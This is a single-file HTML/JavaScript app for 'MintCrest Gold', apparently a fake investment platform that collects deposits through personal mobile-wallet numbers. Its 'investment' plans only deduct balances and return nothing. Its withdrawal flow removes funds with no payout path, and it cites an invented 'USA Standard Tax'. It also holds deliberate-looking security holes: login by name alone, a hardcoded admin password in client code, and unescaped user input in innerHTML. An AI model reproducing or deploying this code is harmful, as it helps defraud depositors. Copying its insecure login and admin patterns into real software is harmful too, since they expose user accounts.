<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>MintCrest Gold | Final Fix</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        /* Scroll Fix: Body ko overflow-y-auto kiya */
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-y: auto; height: 100vh; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .page { display: none; padding-bottom: 120px; } /* Navigation ke liye space */
        .active-page { display: block !important; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
    </style>
</head>
<body class="p-0 m-0">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-6 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="secretAdminTap()" class="text-4xl font-black italic mb-2 tracking-tighter cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-[7px] text-gray-500 uppercase tracking-[0.5em] mb-12 italic">USA STRATEGIC ASSET MANAGEMENT</p>
            <div class="glass p-10 rounded-[3rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="LEGAL FULL NAME" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 text-center font-bold mb-6 uppercase outline-none focus:border-blue-500 text-white">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-lg active:scale-95 transition-all">Establish Session</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden">
        
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6 pt-4">
                <div>
                    <h3 id="display-username" class="text-lg font-black text-blue-400 uppercase italic">Loading...</h3>
                    <span id="user-rank" class="text-[7px] font-black text-yellow-500 uppercase tracking-widest">RANK SECURING...</span>
                </div>
                <button onclick="openSpin()" class="bg-yellow-500 text-black px-5 py-2 rounded-full text-[8px] font-black uppercase shadow-lg">Daily Spin 🎰</button>
            </div>

            <div class="glass p-10 rounded-[3.5rem] mb-6 border-l-8 border-blue-600 relative overflow-hidden">
                <p class="text-[9px] text-blue-400 font-black uppercase mb-1 tracking-widest">Trading Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-4 flex gap-2 items-center"><span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span><span class="text-[8px] font-bold opacity-30 uppercase">System Active</span></div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('deposit')" class="glass p-8 rounded-[2.5rem] font-black text-[9px] uppercase active:scale-95 border-b-4 border-blue-600">Funding</button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] font-black text-[9px] uppercase text-red-500 active:scale-95 border-b-4 border-red-600">Withdraw</button>
            </div>

            <div class="glass p-6 rounded-[2.5rem] border-t-2 border-green-500 text-center shadow-lg">
                <p class="text-[8px] text-gray-500 font-bold uppercase mb-4 tracking-widest">WhatsApp Support</p>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="block w-full bg-green-600 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest">Join Community</a>
            </div>
        </div>

        <div id="p-deposit" class="page p-6">
            <h2 class="text-center font-black italic mb-6 text-blue-500 uppercase pt-4">Capital Funding</h2>
            <div class="glass p-6 rounded-[2.5rem] space-y-4 mb-6">
                <div class="p-4 border border-white/5 rounded-2xl bg-white/2">
                    <p class="text-[8px] opacity-40 uppercase font-bold">JazzCash / SadaPay</p>
                    <p class="text-lg font-black tracking-widest text-blue-400">03705519562</p>
                </div>
                <div class="p-4 border border-white/5 rounded-2xl bg-white/2">
                    <p class="text-[8px] opacity-40 uppercase font-bold">EasyPaisa</p>
                    <p class="text-lg font-black tracking-widest text-green-400">03379827882</p>
                </div>
                <p class="text-[7px] text-gray-500 text-center uppercase font-bold italic">Bhejay gaye paison ka TID niche enter karein</p>
            </div>
            <div class="glass p-8 rounded-[3rem] space-y-4 shadow-2xl">
                <input type="number" id="dep-amt" placeholder="AMOUNT (₨)" class="w-full bg-white/5 p-4 rounded-xl text-center font-black outline-none border border-white/10 text-white">
                <input type="text" id="dep-tid" placeholder="TID / TRANSACTION ID" class="w-full bg-white/5 p-4 rounded-xl text-center font-black outline-none border border-white/10 uppercase text-white">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-4 rounded-xl font-black text-[10px] uppercase shadow-lg">Submit Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <h2 class="text-center font-black italic mb-8 text-red-500 uppercase pt-4">Asset Withdrawal</h2>
            <div class="glass p-8 rounded-[3rem] space-y-4 border-t-8 border-red-600">
                <p class="text-[9px] font-bold text-gray-500 uppercase italic text-center">USA Standard Tax: 10%</p>
                <input type="number" id="wd-amt" placeholder="WITHDRAW AMOUNT" class="w-full bg-white/5 p-4 rounded-xl text-center font-black outline-none border border-white/10 text-white">
                <input type="text" id="wd-acc" placeholder="ACCOUNT NAME & NO." class="w-full bg-white/5 p-4 rounded-xl text-center font-black outline-none border border-white/10 uppercase text-white">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-4 rounded-xl font-black text-[10px] uppercase shadow-lg">Request Payout</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-4"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-4"></div></div>

        <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
            <div class="flex justify-between items-center mb-8"><h2 class="text-xl font-black text-blue-500 uppercase">MASTER ADMIN</h2><button onclick="closeAdmin()" class="bg-red-500 px-6 py-2 rounded-xl text-[10px] font-black uppercase">Close</button></div>
            <div id="adm-requests" class="space-y-4 pb-24"></div>
        </div>

        <nav id="bottom-nav" class="glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[3.5rem] shadow-2xl">
            <button onclick="changePage('home')" id="n-home" class="active-tab px-4 text-2xl">🏠</button>
            <button onclick="changePage('invest')" id="n-invest" class="px-4 text-2xl">📈</button>
            <button onclick="changePage('activity')" id="n-activity" class="px-4 text-2xl">📜</button>
            <button onclick="logout()" class="px-4 text-2xl">🚪</button>
        </nav>
    </main>

    <div id="spin-modal" class="fixed inset-0 bg-black/95 z-[6000] hidden flex items-center justify-center p-8">
        <div class="glass p-10 rounded-[4rem] text-center w-full max-w-sm border-2 border-yellow-500/20">
            <h2 class="text-2xl font-black mb-10 italic uppercase">Lucky Node</h2>
            <div id="wheel" class="w-48 h-48 rounded-full border-8 border-yellow-500 mx-auto mb-10 flex items-center justify-center text-4xl shadow-2xl">🎰</div>
            <button id="spin-btn-action" onclick="startSpin()" class="bg-yellow-500 text-black w-full py-5 rounded-2xl font-black uppercase italic shadow-xl disabled:opacity-30">Spin Now</button>
            <p id="spin-timer" class="mt-6 text-[9px] font-black uppercase text-gray-500 tracking-widest"></p>
            <button onclick="document.getElementById('spin-modal').classList.add('hidden')" class="mt-4 text-[8px] opacity-30 font-black uppercase underline">Back</button>
        </div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null, tapCount = 0;

        const plans = []; for(let i=1; i<=20; i++){ plans.push({ n: `Fleet ${i}`, p: 200 + (i-1)*500 }); }

        window.onload = () => {
            const savedUser = localStorage.getItem('mc_user');
            if(savedUser) { document.getElementById('user-name').value = savedUser; login(); }
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, lastSpin: 0, rank: 'BRONZE MEMBER', time: Date.now() });
            
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('display-username').innerText = name;
            startSync(name); renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('user-rank').innerText = user.rank || 'BRONZE MEMBER'; } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); if(!list) return; list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-5 rounded-3xl mb-3 flex justify-between uppercase text-[9px] font-black border-l-4 border-blue-500"><div>${d.type}</div><div class="text-right">₨ ${d.amount}<br><span class="text-blue-400">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const container = document.getElementById('plans-list'); container.innerHTML = '<h2 class="text-center font-black italic mb-6 text-blue-500 uppercase pt-4">Investment Fleets</h2>';
            plans.forEach((p, i) => { container.innerHTML += `<div class="glass p-6 rounded-[2.5rem] flex justify-between items-center mb-4"><div class="text-[10px] font-black uppercase">NODE ${i+1}<br><span class="text-blue-500">₨ ${p.p}</span></div><button onclick="buyPlan(${i})" class="bg-blue-600 px-6 py-3 rounded-2xl text-[9px] font-black uppercase shadow-lg">Invest</button></div>`; });
        }

        async function buyPlan(i) {
            const p = plans[i]; if(user.balance < p.p) return alert("Paisa kam hai, sweetie!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - p.p, activeTier: p.p, time: Date.now() }); alert("Node Active!");
        }

        async function submitDeposit() { const a = document.getElementById('dep-amt').value, t = document.getElementById('dep-tid').value; if(!a || !t) return; await db.collection("requests").add({ user: user.name, type: "Deposit", amount: parseInt(a), tid: t, status: "pending", time: Date.now() }); alert("Deposit report sent! Wait for approval."); changePage('home'); }
        async function submitWithdraw() { 
            const a = document.getElementById('wd-amt').value, acc = document.getElementById('wd-acc').value; 
            if(!a || !acc) return; 
            if(user.balance < a) return alert("Balance kam hai!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
            await db.collection("requests").add({ user: user.name, type: "Withdraw", amount: parseInt(a), account: acc, status: "pending", time: Date.now() }); 
            alert("Withdrawal requested!"); changePage('home'); 
        }

        function secretAdminTap() { tapCount++; if(tapCount >= 5) { tapCount = 0; if(prompt("Master Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('n-'+p)?.classList.add('active-tab'); window.scrollTo(0,0); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }

        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-3xl border-l-4 border-blue-500 mb-3 font-bold text-[10px] uppercase">${d.user} | ${d.type}<br><span class="opacity-40">${d.tid || d.account || ''} (₨${d.amount})</span><input type="number" id="amt-${doc.id}" value="${d.amount}" class="bg-white/10 p-3 mt-3 outline-none rounded w-full border border-white/10"><div class="flex gap-2 mt-3"><button onclick="approve('${doc.id}', '${d.user}', '${d.type}')" class="bg-blue-600 flex-1 p-3 rounded font-black">APPROVE</button><button onclick="db.collection('requests').doc('${doc.id}').update({status:'rejected'})" class="bg-red-600 flex-1 p-3 rounded font-black">REJECT</button></div></div>`; });
            });
        }

        async function approve(id, userName, type) {
            const val = parseFloat(document.getElementById('amt-'+id).value || 0);
            const uRef = db.collection("users").doc(userName); const uDoc = await uRef.get();
            if(type === 'Deposit' || type === 'Spin Bonus') await uRef.update({ balance: (uDoc.data().balance || 0) + val });
            await db.collection("requests").doc(id).update({ status: 'approved', amount: val }); alert("Done!");
        }

        function openSpin() {
            document.getElementById('spin-modal').classList.remove('hidden');
            const diff = Date.now() - (user?.lastSpin || 0);
            const btn = document.getElementById('spin-btn-action');
            if(diff < 86400000) {
                btn.disabled = true;
                document.getElementById('spin-timer').innerText = `NEXT CHANCE IN ${Math.ceil((86400000-diff)/3600000)}H`;
            } else { btn.disabled = false; document.getElementById('spin-timer').innerText = "READY"; }
        }

        async function startSpin() {
            const win = [5, 10, 20, 50, 0, 100][Math.floor(Math.random()*6)];
            document.getElementById('wheel').innerText = "⏳";
            setTimeout(async () => {
                document.getElementById('wheel').innerText = "₨ " + win;
                if(win > 0) await db.collection("requests").add({ user: user.name, type: "Spin Bonus", amount: win, status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
                alert("Spin result submitted to admin!");
                document.getElementById('spin-modal').classList.add('hidden');
            }, 2000);
        }
    </script>
</body>
</html>
